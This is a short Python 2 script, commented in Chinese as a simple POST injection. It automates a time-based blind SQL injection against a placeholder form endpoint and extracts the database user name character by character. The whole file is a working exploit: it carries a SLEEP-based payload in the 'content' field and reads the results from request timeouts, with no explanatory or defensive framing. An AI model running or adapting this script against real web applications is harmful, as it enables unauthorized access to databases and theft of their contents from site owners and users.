#!/usr/bin/env python
#coding=utf-8

#简单的post注入。
import sys
import requests

reload(sys) 
sys.setdefaultencoding('utf-8')
url = "http://test/index.php"
headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }

user = ""

for j in range(1,25,1):
    for i in range(1,130,1):
        payload = {
            'title':'sdfcxvsdf',
            'content':"a' AND (SELECT(0)FROM(SELECT(CASE WHEN (ASCII(SUBSTRING(user(),"+str(j)+",1))="+str(i)+") THEN SLEEP(5) ELSE SLEEP(0) END))xxxx) AND '1'='1",
            'type_id':2,
            'bm_id':34,
            'username':'%E9%95%BF%E6%B1%9F%E7%BD%91%E5%8F%8B',
            'phone':'11111111',
            'email':'1111@qq.com',
            'Sub':'%E6%8F%90%E4%BA%A4%E7%95%99%E8%A8%80',
            'board_id':1
        }

        try:
            req = requests.post(url, data=payload, headers=headers, timeout=5)
        except:
            user += chr(i)
    print "用户名: "+user